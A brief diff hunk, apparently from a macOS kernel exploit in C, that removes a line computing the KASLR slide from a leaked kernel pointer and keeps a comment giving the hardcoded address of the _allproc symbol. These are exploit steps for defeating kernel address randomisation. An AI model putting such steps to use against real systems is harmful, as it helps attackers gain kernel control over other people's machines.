@@ -320,7 +320,6 @@ gotclock:;
     
     //found kernel base
     uint64_t kernel_base = leaked_ptr;
-    kslide = kernel_base - 0xFFFFFF8000200000;
 
     
     //0xFFFFFF8000ABC490 _allproc
